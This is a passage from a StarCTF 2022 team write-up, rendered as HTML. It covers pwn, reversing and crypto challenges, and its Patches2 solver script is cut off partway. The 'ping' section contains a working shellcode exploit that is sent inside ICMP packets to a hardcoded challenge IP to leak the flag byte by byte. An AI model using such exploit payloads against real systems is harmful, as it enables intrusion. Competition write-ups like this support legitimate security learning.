+</code></pre></div><h3 id="ping">ping</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;i386&#39;</span>
+
+res <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pwn</span>(num,idx):
+	<span style="color:#66d9ef">global</span> res
+	payload1 <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>memcpy(<span style="color:#ae81ff">0x10c2aa</span>,<span style="color:#ae81ff">0x350000</span><span style="color:#f92672">+</span>idx,<span style="color:#ae81ff">1</span>))
+	payload1 <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">	mov eax, 0x0010014b
+</span><span style="color:#e6db74">	jmp eax
+</span><span style="color:#e6db74">	&#39;&#39;&#39;</span>)
+	payload <span style="color:#f92672">=</span>p8(num)<span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">484</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>len(payload1))<span style="color:#f92672">+</span>payload1
+	payload <span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0x10c280</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0x0010c8ac</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x00000023</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x0010a6b4</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x0010a6b4</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x10c2aa</span><span style="color:#f92672">+</span><span style="color:#ae81ff">50</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x0010c8ac</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x00000212</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x0010c280</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x0010c878</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x00010000</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x00107974</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x00010000</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0x2badb002</span>)<span style="color:#f92672">+</span>p32(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>
+
+
+
+
+
+	b <span style="color:#f92672">=</span> IP(dst<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;20.239.70.121&#39;</span>, len<span style="color:#f92672">=</span><span style="color:#ae81ff">596</span>)<span style="color:#f92672">/</span>ICMP()<span style="color:#f92672">/</span>payload
+	b <span style="color:#f92672">=</span> IP(raw(b))
+	checksum_scapy <span style="color:#f92672">=</span> b[ICMP]<span style="color:#f92672">.</span>chksum
+	b <span style="color:#f92672">=</span> IP(dst<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;20.239.70.121&#39;</span>, len<span style="color:#f92672">=</span><span style="color:#ae81ff">596</span>)<span style="color:#f92672">/</span>ICMP(chksum<span style="color:#f92672">=</span>checksum_scapy )<span style="color:#f92672">/</span>payload
+
+
+
+	ping <span style="color:#f92672">=</span> sr1(b, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
+	<span style="color:#66d9ef">if</span> ping:
+		res<span style="color:#f92672">+=</span>p8(num)
+		print(res)
+		<span style="color:#66d9ef">return</span> num
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+
+
+
+<span style="color:#66d9ef">for</span> idx <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">6</span>,<span style="color:#ae81ff">24</span>):
+	<span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x21</span>,<span style="color:#ae81ff">0x7f</span>):
+		print(num,idx)
+		<span style="color:#66d9ef">if</span> pwn(num,idx):
+			<span style="color:#66d9ef">break</span>
+		
+print(res)
+</code></pre></div><h2 id="re">Re</h2>
+<h3 id="simple-file-system">Simple File System</h3>
+<p>输入plantflag可以植入flag文件的某种翻译方式到某个块里</p>
+<p>把所有可打印字符放进flag文件，就可以得到翻译的字典</p>
+<p>在image.flag文件里找*CTF翻译后的前缀，就有整个flag了</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 137; 
+			flex-basis: 328px"
+	>
+	<a href="/post/starctf2022-writeup-by-or4nge/SimpleFileSystem_1.png" data-size="784x572">
+		<img src="/post/starctf2022-writeup-by-or4nge/SimpleFileSystem_1.png"
+			width="784"
+			height="572"
+			srcset="/post/starctf2022-writeup-by-or4nge/SimpleFileSystem_1_hu2976bd832e1392746cab1ea0d313bc96_123980_480x0_resize_box_3.png 480w, /post/starctf2022-writeup-by-or4nge/SimpleFileSystem_1_hu2976bd832e1392746cab1ea0d313bc96_123980_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 1735; 
+			flex-basis: 4164px"
+	>
+	<a href="/post/starctf2022-writeup-by-or4nge/SimpleFileSystem_2.png" data-size="1232x71">
+		<img src="/post/starctf2022-writeup-by-or4nge/SimpleFileSystem_2.png"
+			width="1232"
+			height="71"
+			srcset="/post/starctf2022-writeup-by-or4nge/SimpleFileSystem_2_hub583e42fb6f8e5368de7b65a9894b7ae_32385_480x0_resize_box_3.png 480w, /post/starctf2022-writeup-by-or4nge/SimpleFileSystem_2_hub583e42fb6f8e5368de7b65a9894b7ae_32385_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h3 id="jump">Jump</h3>
+<p>在sub_402689运行了 <code>sub_4119F0(qword_4C9400, (__int64)&quot;%c%s%c&quot;, 2LL, (const char *)dword_4C9620, 3LL);</code> 后下硬件断点，发现生成了以所有位置为起始的字符串。</p>
+<p>随后这些字符串传入 <code>sub_401F62</code>，进行快排。</p>
+<p>最后在 <code>sub_402826</code> 中以排序后的所有字符串的最后一位构成密文，并与目标比较</p>
+<p><figure 
+	
+		class="gallery-image" 
+		style="
+			flex-grow: 233; 
+			flex-basis: 560px"
+	>
+	<a href="/post/starctf2022-writeup-by-or4nge/Jump_1.png" data-size="1470x629">
+		<img src="/post/starctf2022-writeup-by-or4nge/Jump_1.png"
+			width="1470"
+			height="629"
+			srcset="/post/starctf2022-writeup-by-or4nge/Jump_1_hua0d016549212b270bab283598a2484d4_79693_480x0_resize_box_3.png 480w, /post/starctf2022-writeup-by-or4nge/Jump_1_hua0d016549212b270bab283598a2484d4_79693_1024x0_resize_box_3.png 1024w"
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>因此可以得知target中每个字符的后一个字符是顺序排列的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">jmGn_=uaSZLvN4wFxE6R+p</span><span style="color:#ae81ff">\x02</span><span style="color:#e6db74">D2qV1CBTck&#39;</span>
+sorttar <span style="color:#f92672">=</span> list(target)
+sorttar<span style="color:#f92672">.</span>sort()
+flag <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x03</span><span style="color:#e6db74">&#39;</span>]
+
+<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x21</span>):
+    c <span style="color:#f92672">=</span> flag[<span style="color:#ae81ff">0</span>]
+    flag <span style="color:#f92672">=</span> [target[sorttar<span style="color:#f92672">.</span>index(c)]] <span style="color:#f92672">+</span> flag
+print (<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(flag[<span style="color:#ae81ff">1</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
+</code></pre></div><h3 id="nacl">NaCl</h3>
+<p>一个 feistal 结构的8字节分组密码，一个 xtea 密码</p>
+<p>整体循环分为 4 次，每次处理 8 字节</p>
+<p>先进行密钥扩展，这一步每次都要进，但仅第一次执行</p>
+<p>随后进行 feistal 的加密，加密之后进行 xtea 加密，xtea的循环次数取决于大循环的次数</p>
+<p>解密脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> libnum <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xtea_decrypt</span>(v, i):
+    <span style="color:#e6db74">&#39;&#39;&#39;v: list&#39;&#39;&#39;</span>
+    key <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x3020100</span>, <span style="color:#ae81ff">0x7060504</span>, <span style="color:#ae81ff">0xB0A0908</span>, <span style="color:#ae81ff">0xF0E0D0C</span>]
+    v0, v1 <span style="color:#f92672">=</span> v
+    delta <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10325476</span>
+    sum<span style="color:#f92672">=</span>(delta <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i):
+        v1 <span style="color:#f92672">-=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>])
+        v1 <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffffffff</span>
+        sum <span style="color:#f92672">-=</span> delta
+        sum <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffffffff</span>
+        v0 <span style="color:#f92672">-=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>])
+        v0 <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffffffff</span>
+    <span style="color:#66d9ef">return</span> [v0, v1]
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rol</span>(x, i):
+    <span style="color:#66d9ef">return</span> ((x <span style="color:#f92672">&lt;&lt;</span> i) <span style="color:#f92672">|</span> (x <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> i))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span>
+
+key <span style="color:#f92672">=</span> [
+    <span style="color:#ae81ff">0x4050607</span>, <span style="color:#ae81ff">0x10203</span>, <span style="color:#ae81ff">0x0C0D0E0F</span>, <span style="color:#ae81ff">0x8090A0B</span>, <span style="color:#ae81ff">0x0CD3FE81B</span>, <span style="color:#ae81ff">0x0D7C45477</span>, <span style="color:#ae81ff">0x9F3E9236</span>, <span style="color:#ae81ff">0x107F187</span>,
+    <span style="color:#ae81ff">0x0F993CB81</span>, <span style="color:#ae81ff">0x0BF74166C</span>, <span style="color:#ae81ff">0x0DA198427</span>, <span style="color:#ae81ff">0x1A05ABFF</span>, <span style="color:#ae81ff">0x9307E5E4</span>, <span style="color:#ae81ff">0x0CB8B0E45</span>, <span style="color:#ae81ff">0x306DF7F5</span>, <span style="color:#ae81ff">0x0AD300197</span>, 
+    <span style="color:#ae81ff">0x0AA86B056</span>, <span style="color:#ae81ff">0x449263BA</span>, <span style="color:#ae81ff">0x3FA4401B</span>, <span style="color:#ae81ff">0x1E41F917</span>, <span style="color:#ae81ff">0x0C6CB1E7D</span>, <span style="color:#ae81ff">0x18EB0D7A</span>, <span style="color:#ae81ff">0x0D4EC4800</span>, <span style="color:#ae81ff">0x0B486F92B</span>, 
+    <span style="color:#ae81ff">0x8737F9F3</span>, <span style="color:#ae81ff">0x765E3D25</span>, <span style="color:#ae81ff">0x0DB3D3537</span>, <span style="color:#ae81ff">0x0EE44552B</span>, <span style="color:#ae81ff">0x11D0C94C</span>, <span style="color:#ae81ff">0x9B605BCB</span>, <span style="color:#ae81ff">0x903B98B3</span>, <span style="color:#ae81ff">0x24C2EEA3</span>, 
+    <span style="color:#ae81ff">0x896E10A2</span>, <span style="color:#ae81ff">0x2247F0C0</span>, <span style="color:#ae81ff">0x0B84E5CAA</span>, <span style="color:#ae81ff">0x8D2C04F0</span>, <span style="color:#ae81ff">0x3BC7842C</span>, <span style="color:#ae81ff">0x1A50D606</span>, <span style="color:#ae81ff">0x49A1917C</span>, <span style="color:#ae81ff">0x7E1CB50C</span>,
+    <span style="color:#ae81ff">0x0FC27B826</span>, <span style="color:#ae81ff">0x5FDDDFBC</span>, <span style="color:#ae81ff">0x0DE0FC404</span>, <span style="color:#ae81ff">0xB2B30907</span>
+]
+
+cipher <span style="color:#f92672">=</span> [
+    <span style="color:#ae81ff">0xFDF5C266</span>, <span style="color:#ae81ff">0x7A328286</span>, <span style="color:#ae81ff">0xCE944004</span>, <span style="color:#ae81ff">0x5DE08ADC</span>, 
+    <span style="color:#ae81ff">0xA6E4BD0A</span>, <span style="color:#ae81ff">0x16CAADDC</span>, <span style="color:#ae81ff">0x13CD6F0C</span>, <span style="color:#ae81ff">0x1A75D936</span>, 
+]
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>):
+    l, r <span style="color:#f92672">=</span> xtea_decrypt(cipher[<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>i:<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>], i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">44</span>):
+        l, r <span style="color:#f92672">=</span> r, l
+        l <span style="color:#f92672">^=</span> (rol(r, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">&amp;</span> rol(r, <span style="color:#ae81ff">8</span>)) <span style="color:#f92672">^</span> rol(r, <span style="color:#ae81ff">2</span>) <span style="color:#f92672">^</span> key[<span style="color:#ae81ff">43</span> <span style="color:#f92672">-</span> j]
+    l, r <span style="color:#f92672">=</span> r, l
+    print (n2s(l)<span style="color:#f92672">.</span>decode() <span style="color:#f92672">+</span> n2s(r)<span style="color:#f92672">.</span>decode(), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</code></pre></div><h2 id="crypto">Crypto</h2>
+<h3 id="ezrsa">ezRSA</h3>
+<p>q的前124位能求出来，然后第300-900位可以通过移比特确定（看下面代码，思路跟zer0pts那个anti很像），最后300位直接copper</p>
+<p>不知道为啥，本地测试了一下，下面这个脚本只能爆出450-900位的，第300-450有点小问题，但是总共只有450bit不确定，还是能直接copper，直接就出了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
+<span style="color:#f92672">import</span> gmpy2
+
+n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd7f6c90512bc9494370c3955ff3136bb245a6d1095e43d8636f66f11db525f2063b14b2a4363a96e6eb1bea1e9b2cc62b0cae7659f18f2b8e41fca557281a1e859e8e6b35bd114655b6bf5e454753653309a794fa52ff2e79433ca4bbeb1ab9a78ec49f49ebee2636abd9dd9b80306ae1b87a86c8012211bda88e6e14c58805feb6721a01481d1a7031eb3333375a81858ff3b58d8837c188ffcb982a631e1a7a603b947a6984bd78516c71cfc737aaba479688d56df2c0952deaf496a4eb3f603a46a90efbe9e82a6aef8cfb23e5fcb938c9049b227b7f15c878bd99b61b6c56db7dfff43cd457429d5dcdb5fe314f1cdf317d0c5202bad6a9770076e9b25b1</span>
+
+hight_124 <span style="color:#f92672">=</span> int(bin(gmpy2<span style="color:#f92672">.</span>iroot(n, <span style="color:#ae81ff">2</span>)[<span style="color:#ae81ff">0</span>])[<span style="color:#ae81ff">2</span>:][:<span style="color:#ae81ff">124</span>], <span style="color:#ae81ff">2</span>)
+p <span style="color:#f92672">=</span> ((hight_124 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">900</span>) <span style="color:#f92672">^</span> (<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">900</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">^</span> ((<span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">300</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+q <span style="color:#f92672">=</span> (hight_124 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">900</span>)
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">898</span>, <span style="color:#ae81ff">299</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+    cur <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">&lt;&lt;</span>i
+    <span style="color:#66d9ef">if</span> (p<span style="color:#f92672">^</span>cur) <span style="color:#f92672">*</span> (q<span style="color:#f92672">^</span>cur) <span style="color:#f92672">&lt;</span> n:
+        p <span style="color:#f92672">^=</span> cur
+        q <span style="color:#f92672">^=</span> cur
+
+print(p <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">450</span>)
+<span style="color:#75715e">#Sage</span>
+<span style="color:#f92672">from</span> sage.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3</span>
+
+
+
+p4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">58804727289972133098258523381187273579708165828871631637667339400276723145699294300854967408059394786721660574269169740095474486979958553835424583960343801193657276948482959</span>
+
+e <span style="color:#f92672">=</span>  <span style="color:#ae81ff">65537</span>
+pbits <span style="color:#f92672">=</span> <span style="color:#ae81ff">1024</span>
+kbits <span style="color:#f92672">=</span> pbits <span style="color:#f92672">-</span> p4<span style="color:#f92672">.</span>nbits()
+print(p4<span style="color:#f92672">.</span>nbits())
+p4 <span style="color:#f92672">=</span> p4 <span style="color:#f92672">&lt;&lt;</span> kbits
+PR<span style="color:#f92672">.&lt;</span>x<span style="color:#f92672">&gt;</span> <span style="color:#f92672">=</span> PolynomialRing(Zmod(n))
+f <span style="color:#f92672">=</span> x <span style="color:#f92672">+</span> p4
+roots <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>small_roots(X<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#f92672">^</span>kbits, beta<span style="color:#f92672">=</span><span style="color:#ae81ff">0.4</span>)
+<span style="color:#75715e">#经过以上一些函数处理后，n和p已经被转化为10进制</span>
+<span style="color:#66d9ef">if</span> roots:        
+        p <span style="color:#f92672">=</span> p4<span style="color:#f92672">+</span>int(roots[<span style="color:#ae81ff">0</span>]) 
+        print(<span style="color:#e6db74">&#34;n: &#34;</span><span style="color:#f92672">+</span>str(n))
+        print(<span style="color:#e6db74">&#34;p: &#34;</span><span style="color:#f92672">+</span>str(p))
+        print(<span style="color:#e6db74">&#34;q: &#34;</span><span style="color:#f92672">+</span>str(n<span style="color:#f92672">//</span>p))
+</code></pre></div><h3 id="patches2">Patches2</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> hashlib
+C0 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C0&#39;</span>
+C1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C1&#39;</span>
+C2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C2&#39;</span>
+C3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C3&#39;</span>
+C4 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C4&#39;</span>
+C5 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C5&#39;</span>
+C6 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;C6&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GFDiv</span>(x, z):
+    mod <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">while</span> x<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">&gt;=</span> z<span style="color:#f92672">.</span>bit_length():
+        bitLack <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>bit_length() <span style="color:#f92672">-</span> z<span style="color:#f92672">.</span>bit_length()
+        x <span style="color:#f92672">=</span> x <span style="color:#f92672">^</span> (z <span style="color:#f92672">&lt;&lt;</span> bitLack)
+        mod <span style="color:#f92672">=</span> mod <span style="color:#f92672">^</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> bitLack)
+    <span style="color:#66d9ef">return</span> mod, x
+
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">GFMul</span>(x, z):
+    i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    res <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">while</span> z <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">if</span> z <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>:
+            res <span style="color:#f92672">=</span> res <span style="color:#f92672">^</span> (x <span style="color:#f92672">&lt;&lt;</span> i)
+        i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+        z <span style="color:#f92672">=</span> (z <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">return</span> res
+
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(a, b):
+    xor <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;( ( </span><span style="color:#e6db74">%(a)s</span><span style="color:#e6db74"> ) and ( ( </span><span style="color:#e6db74">%(b)s</span><span style="color:#e6db74"> ) == 0 ) ) or ( ( </span><span style="color:#e6db74">%(b)s</span><span style="color:#e6db74"> ) and ( ( </span><span style="color:#e6db74">%(a)s</span><span style="color:#e6db74"> ) == 0 ) )&#39;</span>
+    s <span style="color:#f92672">=</span> xor <span style="color:#f92672">%</span> {<span style="color:#e6db74">&#39;a&#39;</span>: a, <span style="color:#e6db74">&#39;b&#39;</span>: b}
+    <span style="color:#66d9ef">return</span> s
+
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor3</span>(a, b, c):
+    temp <span style="color:#f92672">=</span> xor(a, b)
+    <span style="color:#66d9ef">return</span> xor(temp, c)
+
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor4</span>(a, b, c, d):
+    temp <span style="color:#f92672">=</span> xor(a, b)
+    temp2 <span style="color:#f92672">=</span> xor(c, d)
+    <span style="color:#66d9ef">return</span> xor(temp, temp2)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">f</span>(n):
+    <span style="color:#66d9ef">if</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+
+
+BCHcode <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;&#34;</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">15</span>)]
+BCHcode[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> C0
+BCHcode[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> C1
+BCHcode[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> C2
+BCHcode[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> C3
+BCHcode[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> xor(C0, C4)
+BCHcode[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> xor(C1, C5)
+BCHcode[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> xor3(C0, C2, C6)
+BCHcode[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> xor3(C0, C1, C3)
+BCHcode[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> xor4(C0, C1, C2, C4)
+BCHcode[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> xor4(C1, C2, C3, C5)
+BCHcode[<span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> xor4(C2, C3, C4, C6)
+BCHcode[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> xor3(C3, C4, C5)
+BCHcode[<span style="color:#ae81ff">12</span>] <span style="color:#f92672">=</span> xor3(C4, C5, C6)
+BCHcode[<span style="color:#ae81ff">13</span>] <span style="color:#f92672">=</span> xor(C5, C6)
+BCHcode[<span style="color:#ae81ff">14</span>] <span style="color:#f92672">=</span> C6
+
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;linux&#34;</span>,log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#34;124.71.145.24&#34;</span>,<span style="color:#ae81ff">60002</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;sha256(xxxx+&#34;</span>)
+leave<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>decode()
+print(leave)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;== &#34;</span>)
+sha256<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">64</span>)<span style="color:#f92672">.</span>decode()
+print(sha256)
+pd<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">127</span>):
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>,<span style="color:#ae81ff">127</span>):
